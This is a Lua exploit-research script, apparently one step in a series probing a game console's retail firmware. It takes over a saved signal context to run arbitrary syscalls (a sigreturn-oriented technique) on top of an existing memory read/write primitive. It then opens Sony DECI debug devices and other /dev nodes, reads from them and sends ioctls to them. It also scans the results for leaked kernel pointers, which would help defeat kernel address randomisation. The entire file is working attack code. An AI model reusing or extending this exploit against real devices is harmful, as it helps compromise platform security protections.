-- CRASH_CLASS: MODERATE
-- PROBE 137d: DECI debug device exploration + full /dev scan
--
-- 137c found 13 DECI debug devices in /dev (deci_stdout, deci_stdin,
-- deci_tty2-14, deci_ttya0/b0/c0). These are Sony's internal debug
-- communication interfaces used in development kits.
-- If they respond on retail firmware, they might leak kernel state
-- or provide privileged I/O channels.
-- Also: continue /dev scan for more devices beyond the first 30.

print("=== PROBE 137d: DECI DEVICES ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local pid = to_num(sc20())
print("pid=" .. pid)

local MC = 0x40
local ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(ctx)) end)
local rip = memory.read_qword(ctx + MC + 0xA0)
local rh, rl = get_hi_lo(rip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(ctx)) end)
    memory.write_qword(ctx + MC + 0xA0, sc_addr)
    memory.write_qword(ctx + MC + 0x38, uint64(num))
    if a1 then memory.write_qword(ctx + MC + 0x08, a1) end
    if a2 then memory.write_qword(ctx + MC + 0x10, a2) end
    if a3 then memory.write_qword(ctx + MC + 0x18, a3) end
    if a4 then memory.write_qword(ctx + MC + 0x50, a4) end
    if a5 then memory.write_qword(ctx + MC + 0x28, a5) end
    if a6 then memory.write_qword(ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(ctx)) end)
    return rv
end

local sc_mmap = make_syscall(477)
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x40000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))
local function ua(v) return uint64(string.format("0x%X", to_num(v))) end
local function ws(buf, s)
    for i = 1, #s do memory.write_byte(buf+i-1, string.byte(s,i)) end
    memory.write_byte(buf+#s, 0)
end
local function zero(addr, len)
    for off = 0, len - 1, 4 do memory.write_dword(addr + off, 0) end
end
local kfound = 0

--------------------------------------------------------------------
-- SECTION A: Open and probe every DECI device
--------------------------------------------------------------------
print("")
print("--- [A] DECI devices ---")

local path_buf = gpu + 0x100
local read_buf = gpu + 0x200
local ioctl_buf = gpu + 0x400

local deci_devs = {
    "deci_stdin", "deci_stdout", "deci_stderr",
    "deci_tty2", "deci_tty3", "deci_tty4", "deci_tty5",
    "deci_tty6", "deci_tty7", "deci_tty8", "deci_tty9",
    "deci_tty10", "deci_tty11", "deci_tty12", "deci_tty13",
    "deci_tty14",
    "deci_ttya0", "deci_ttyb0", "deci_ttyc0",
}

local open_fds = {}
for _, dev in ipairs(deci_devs) do
    ws(path_buf, "/dev/" .. dev)
    -- Try O_RDWR(2), O_RDONLY(0), O_NONBLOCK(4)
    local fd_rw = srop(5, ua(path_buf), uint64(2))
    local fh, fl = get_hi_lo(fd_rw)

    if fl > 0 and fl < 256 and fh == 0 then
        print(string.format("[A] /dev/%s OPEN fd=%d (O_RDWR)", dev, fl))
        table.insert(open_fds, {name=dev, fd=fl})
    else
        -- Try O_RDONLY
        local fd_ro = srop(5, ua(path_buf), uint64(0))
        fh, fl = get_hi_lo(fd_ro)
        if fl > 0 and fl < 256 and fh == 0 then
            print(string.format("[A] /dev/%s OPEN fd=%d (O_RDONLY)", dev, fl))
            table.insert(open_fds, {name=dev, fd=fl})
        else
            -- Try O_WRONLY
            local fd_wo = srop(5, ua(path_buf), uint64(1))
            fh, fl = get_hi_lo(fd_wo)
            if fl > 0 and fl < 256 and fh == 0 then
                print(string.format("[A] /dev/%s OPEN fd=%d (O_WRONLY)", dev, fl))
                table.insert(open_fds, {name=dev, fd=fl})
            end
        end
    end
end
print("[A] opened " .. #open_fds .. " DECI devices")
print("[A] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION B: Read/write/ioctl on open DECI devices
--------------------------------------------------------------------
print("")
print("--- [B] DECI I/O ---")

for _, d in ipairs(open_fds) do
    -- fstat
    zero(read_buf, 0x100)
    local rv_fs = srop(189, uint64(d.fd), ua(read_buf))
    local fsh, fsl = get_hi_lo(rv_fs)
    if fsl == 0 and fsh == 0 then
        local dev_id = safe_rq(read_buf)
        local ino = safe_rq(read_buf + 8)
        local mode = to_num(memory.read_dword(read_buf + 0x10))
        local size = safe_rq(read_buf + 0x48)
        print(string.format("[B] %s: dev=%s ino=%s mode=0x%X size=%s",
            d.name, hex(dev_id), hex(ino), mode, hex(size)))
        -- Scan fstat for kernel pointers
        for off = 0, 0x70, 8 do
            local v = safe_rq(read_buf + off)
            if v then
                local vh, vl = get_hi_lo(v)
                if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                    kfound = kfound + 1
                    print(string.format("[B] *** KPTR %s fstat+0x%02X: %s ***",
                        d.name, off, hex(v)))
                end
            end
        end
    end

    -- Non-blocking read
    zero(read_buf, 0x100)
    local rv_rd = srop(3, uint64(d.fd), ua(read_buf), uint64(0x100))
    local rdh, rdl = get_hi_lo(rv_rd)
    if rdl > 0 and rdl < 0x200 and rdh == 0 then
        print(string.format("[B] %s read: %d bytes!", d.name, rdl))
        -- Show first bytes as hex
        local s = ""
        for i = 0, math.min(rdl, 32) - 1 do
            s = s .. string.format("%02X ", to_num(memory.read_byte(read_buf + i)))
        end
        print("[B]   " .. s)
        -- Check for kernel pointers
        for off = 0, math.min(rdl, 0x80) - 4, 8 do
            local v = safe_rq(read_buf + off)
            if v then
                local vh, vl = get_hi_lo(v)
                if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                    kfound = kfound + 1
                    print(string.format("[B] *** KPTR %s read+0x%02X: %s ***",
                        d.name, off, hex(v)))
                end
            end
        end
    elseif rdl == 0 and rdh == 0 then
        print(string.format("[B] %s read: 0 bytes (EOF)", d.name))
    end

    -- Try standard tty ioctls
    local tty_ioctls = {
        {name="TIOCGETA", code=0x40487413},   -- get termios
        {name="TIOCGWINSZ", code=0x40087468}, -- get window size
        {name="TIOCGPGRP", code=0x40047477},  -- get pgrp
        {name="FIONREAD", code=0x4004667F},   -- bytes available
        {name="TIOCGSID", code=0x40047463},   -- get session id
        {name="FIONBIO", code=0x8004667E},    -- set non-blocking
    }

    for _, ioc in ipairs(tty_ioctls) do
        zero(ioctl_buf, 0x100)
        local rv_io = srop(54, uint64(d.fd), uint64(ioc.code), ua(ioctl_buf))
        local ioh, iol = get_hi_lo(rv_io)
        if iol == 0 and ioh == 0 then
            print(string.format("[B] %s %s: SUCCESS!", d.name, ioc.name))
            for off = 0, 0x40, 8 do
                local v = safe_rq(ioctl_buf + off)
                if v then
                    local vh, vl = get_hi_lo(v)
                    if vh > 0 or vl > 0 then
                        print(string.format("    +0x%02X: %s", off, hex(v)))
                    end
                    if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                        kfound = kfound + 1
                        print("    *** KERNEL POINTER! ***")
                    end
                end
            end
        end
    end

    -- Limit to first 5 devices to avoid timeout
    if #open_fds > 5 then break end
end

-- Close DECI fds
for _, d in ipairs(open_fds) do
    srop(6, uint64(d.fd))
end
print("[B] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION C: Full /dev scan — get ALL entries
--------------------------------------------------------------------
print("")
print("--- [C] full /dev scan ---")

ws(path_buf, "/dev")
local fd_dev = srop(5, ua(path_buf), uint64(0x20000))
local devh, devl = get_hi_lo(fd_dev)

if devl > 0 and devl < 256 and devh == 0 then
    local dir_buf = gpu + 0x800
    local basep = gpu + 0x7F80
    local total_entries = 0

    for pass = 1, 5 do  -- up to 5 reads to get all entries
        zero(dir_buf, 0x2000)
        memory.write_qword(basep, uint64(0))
        local rv_gd = srop(196, uint64(devl), ua(dir_buf), uint64(0x2000), ua(basep))
        local gdh, gdl = get_hi_lo(rv_gd)
        if gdl == 0 or gdh ~= 0 then break end

        local offset = 0
        while offset < gdl do
            local fileno = to_num(memory.read_dword(dir_buf + offset))
            local reclen = to_num(memory.read_dword(dir_buf + offset + 4)) % 65536
            local dtype = math.floor(to_num(memory.read_dword(dir_buf + offset + 4)) / 65536) % 256
            local namlen = math.floor(to_num(memory.read_dword(dir_buf + offset + 4)) / 16777216)
            if reclen == 0 then break end
            local name = ""
            for i = 0, math.min(namlen, 60) - 1 do
                local b = to_num(memory.read_byte(dir_buf + offset + 8 + i))
                if b >= 32 and b < 127 then name = name .. string.char(b) end
            end
            -- Only print entries we didn't see in 137c
            if total_entries >= 30 and #name > 0 then
                print(string.format("[C] ino=%d type=%d %s", fileno, dtype, name))
            end
            total_entries = total_entries + 1
            offset = offset + reclen
        end
    end
    print("[C] total /dev entries=" .. total_entries)
    srop(6, uint64(devl))
end
print("[C] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION D: Open additional promising devices
--------------------------------------------------------------------
print("")
print("--- [D] additional /dev nodes ---")

local extra_devs = {
    "console", "tty", "ptmx", "bpf", "pf",
    "hid", "gc", "dce", "gic", "camera",
    "notification0", "notification1",
    "ajm", "ajmi", "bt", "usbctl",
    "dmem0", "dmem1", "dmem2",
    "rng", "crypto",
}

for _, dev in ipairs(extra_devs) do
    ws(path_buf, "/dev/" .. dev)
    local fd_d = srop(5, ua(path_buf), uint64(2))
    local dh, dl = get_hi_lo(fd_d)
    if dl > 0 and dl < 256 and dh == 0 then
        print(string.format("[D] /dev/%s OPEN fd=%d", dev, dl))

        -- fstat for dev_id (might tell us something about kernel internals)
        zero(read_buf, 0x100)
        srop(189, uint64(dl), ua(read_buf))
        local st_dev = safe_rq(read_buf)
        local st_rdev = safe_rq(read_buf + 0x50)
        print(string.format("[D]   dev=%s rdev=%s", hex(st_dev), hex(st_rdev)))

        -- Check rdev for kernel pointers
        if st_rdev then
            local rvh, rvl = get_hi_lo(st_rdev)
            if rvh >= 0xFFFF8000 and rvh ~= 0xFFFFFFFF then
                kfound = kfound + 1
                print("[D]   *** KERNEL POINTER in st_rdev! ***")
            end
        end

        srop(6, uint64(dl))
    end
end
print("[D] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION E: Scan /dev/fd directory (process file descriptors)
--------------------------------------------------------------------
print("")
print("--- [E] /dev/fd ---")

ws(path_buf, "/dev/fd")
local fd_fdd = srop(5, ua(path_buf), uint64(0x20000))
local fddh, fddl = get_hi_lo(fd_fdd)
if fddl > 0 and fddl < 256 and fddh == 0 then
    local dir_buf2 = gpu + 0x2000
    zero(dir_buf2, 0x1000)
    local basep2 = gpu + 0x7F80
    memory.write_qword(basep2, uint64(0))
    local rv_fd = srop(196, uint64(fddl), ua(dir_buf2), uint64(0x1000), ua(basep2))
    local fdh2, fdl2 = get_hi_lo(rv_fd)
    if fdl2 > 0 and fdh2 == 0 then
        print("[E] /dev/fd: " .. fdl2 .. " bytes")
        local offset = 0
        while offset < fdl2 do
            local fileno = to_num(memory.read_dword(dir_buf2 + offset))
            local reclen = to_num(memory.read_dword(dir_buf2 + offset + 4)) % 65536
            local namlen = math.floor(to_num(memory.read_dword(dir_buf2 + offset + 4)) / 16777216)
            if reclen == 0 then break end
            local name = ""
            for i = 0, math.min(namlen, 30) - 1 do
                local b = to_num(memory.read_byte(dir_buf2 + offset + 8 + i))
                if b >= 32 and b < 127 then name = name .. string.char(b) end
            end
            print(string.format("[E]   ino=%d %s", fileno, name))
            offset = offset + reclen
        end
    end
    srop(6, uint64(fddl))
else
    print("[E] /dev/fd open failed")
end
print("[E] pid=" .. to_num(sc20()))

print("")
print("TOTAL kptrs=" .. kfound)
print("pid=" .. to_num(sc20()))
print("=== DONE ===")
